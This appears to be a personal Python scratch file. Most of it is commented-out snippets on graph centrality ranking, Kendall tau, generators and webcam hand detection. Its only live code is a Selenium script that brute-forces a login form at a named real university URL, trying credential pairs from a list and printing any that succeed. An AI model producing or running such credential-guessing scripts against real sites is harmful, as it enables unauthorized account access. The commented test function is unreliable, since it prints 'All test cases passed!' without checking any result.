# def get_top_n_values(centrality, node_id_to_name, top20=True):
#     degree_dict = dict()
#     for node, value in centrality.items():
#         node_name = node_id_to_name[node]
#         degree_dict[node_name] = value
#     sorted_degree = sorted(degree_dict.items(), key=lambda x: x[1])
#
#     if top20:
#         return sorted_degree[-1*2:]
#     return sorted_degree
#
# def test_get_top_n_values():
#     # Test case 1
#     centrality = {1: 0.5, 2: 0.8, 3: 0.3}
#     node_id_to_name = {1: 'A', 2: 'B', 3: 'C'}
#     expected_output = [('B', 0.8), ('A', 0.5), ('C', 0.3)]
#     print(get_top_n_values(centrality, node_id_to_name))
#
#     # Test case 2
#     centrality = {4: 0.9, 5: 0.1, 6: 0.6}
#     node_id_to_name = {4: 'D', 5: 'E', 6: 'F'}
#     expected_output = [('E', 0.1), ('F', 0.6), ('D', 0.9)]
#     print(get_top_n_values(centrality, node_id_to_name))
#
#     # Test case 3 (top20=True)
#     centrality = {7: 0.4, 8: 0.7, 9: 0.2}
#     node_id_to_name = {7: 'G', 8: 'H', 9: 'I'}
#     expected_output = [('I', 0.2), ('G', 0.4), ('H', 0.7)]
#     print(get_top_n_values(centrality, node_id_to_name))
#
#     print("All test cases passed!")
#
#
# # Run the test function
# test_get_top_n_values()


# from scipy.stats import kendalltau
#
# l1 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30]
# l2 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 19, 20, 261, 28, 33, 34, 35, 36, 37, 38, 39, 40, 45, 63, 145, 209,22]
#
# print(kendalltau(l1, l2))


# ranked_data = [['walthamstowcentral', 1], ['chiswickpark', 2], ['westkensington', 3], ['amersham', 4]]
# stations = ['walthamstowcentral', 'amersham', 'westkensington', 'chiswickpark']
#
# ranked_dict = {station: rank for station, rank in ranked_data}
# rank_values = [ranked_dict[station] for station in stations]
# print(rank_values)
#
# import numpy as np
# from scipy.stats import kendalltau
#
# # Create two rankings of the same 5 observations
# ranking_1 = np.array([1, 2, 3, 4, 5])
# ranking_2 = np.array([3, 1, 5, 2, 4])
#
# # Calculate the Kendall tau distance and correlation
# tau_distance, tau_correlation = kendalltau(ranking_1, ranking_2)
#
# # Print the Kendall tau distance
# print("Kendall tau distance:", tau_distance)
#
#
# from scipy.stats import kendalltau
#
# # Two example rankings
# ranking1 = [1, 2, 3, 4, 5]
# ranking2 = [3, 2, 1, 5, 4]
#
# # Calculate Kendall tau distance
# distance = kendalltau(ranking1, ranking2).correlation
# print("Kendall Tau Distance:", distance)
#
# # Calculate Kendall tau correlation
# correlation, _ = kendalltau(ranking1, ranking2)
# print("Kendall Tau Correlation:", correlation)


# def generate_squares_generator(limit):
#     for i in range(limit):
#         print(i)
#         yield i**2
#
# # Using the generator to produce squares for numbers up to 5
# squares_generator = generate_squares_generator(5)
#
# # Since it's a generator, we can iterate through it using a loop
# for square in squares_generator:
#     print(square)


import cv2
import mediapipe as mp


# def main():
#     cap = cv2.VideoCapture(0)  # Initialize webcam (0 for default camera)
#
#     mp_hands = mp.solutions.hands
#     hands = mp_hands.Hands(max_num_hands=1, min_detection_confidence=0.5)
#
#     while cap.isOpened():
#         ret, frame = cap.read()
#
#         if not ret:
#             break
#
#         # Convert the image from BGR to RGB
#         rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
#
#         # Process the image and detect hands
#         results = hands.process(rgb_frame)
#
#         if results.multi_hand_landmarks:
#             for hand_landmarks in results.multi_hand_landmarks:
#                 for landmark in hand_landmarks.landmark:
#                     x, y = int(landmark.x * frame.shape[1]), int(landmark.y * frame.shape[0])
#                     cv2.circle(frame, (x, y), 5, (0, 255, 0), -1)
#
#         cv2.imshow('Hand Detector', frame)
#
#         if cv2.waitKey(1) & 0xFF == 27:  # Press 'Esc' to exit
#             break
#
#     cap.release()
#     cv2.destroyAllWindows()
#
#
# if __name__ == "__main__":
#     main()

















from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Replace 'path_to_chromedriver' with the actual path to your Chrome WebDriver executable
chrome_options = webdriver.ChromeOptions()
driver = webdriver.Chrome(executable_path='/Users/raheelwaqar/Desktop/chromedriver', chrome_options=chrome_options)

# Replace 'your_form_url' with the URL of your local form
form_url = 'https://maxinity.uclan.ac.uk/dentistry/'

# Function to fill the form and submit
def fill_and_submit_form(username, password):
    driver.get(form_url)

    # Replace 'username_field_id' and 'password_field_id' with the actual IDs of your form fields
    username_field = driver.find_element_by_id('username_field_id')
    password_field = driver.find_element_by_id('password_field_id')

    # Fill the form fields with provided credentials
    username_field.send_keys(username)
    password_field.send_keys(password)

    # Replace 'submit_button_id' with the actual ID of your submit button
    submit_button = driver.find_element_by_id('submit_button_id')
    submit_button.click()

# Replace 'brute_force_list' with a list of tuples containing username and password combinations to test
brute_force_list = [('user1', 'pass1'), ('user2', 'pass2'), ('user3', 'pass3')]

try:
    for username, password in brute_force_list:
        fill_and_submit_form(username, password)

        # Wait for the response page to load and check if the login was successful or not
        # You need to customize the below code based on your form's response or error messages
        WebDriverWait(driver, 10).until(EC.title_contains('Success'))

        # If the login was successful, print the credentials
        print(f"Successful login: Username: {username}, Password: {password}")

except Exception as e:
    print(f"An error occurred: {e}")

finally:
    driver.quit()
